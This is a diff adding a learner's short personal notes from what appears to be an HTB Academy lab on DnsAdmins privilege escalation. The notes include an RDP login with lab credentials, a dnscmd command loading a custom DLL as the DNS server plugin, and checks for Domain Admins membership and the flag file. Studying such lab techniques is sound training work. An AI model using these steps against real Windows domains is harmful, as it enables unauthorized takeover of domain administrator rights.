@@ -1,1 +1,16 @@
 
+
+** ima restart on this one tomorrow.... i ahd trouble the first two times with this one specifically. i follow the steps and get added to "Domain Admins" but never can access the flag..**** 
+
+xfreerdp /v:10.129.80.73 /u:netadm /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
+
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+sc.exe sdshow DNS
+
+wmic useraccount where name="netadm" get sid
+
+net group "Domain Admins" /dom
+
+
+cat c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
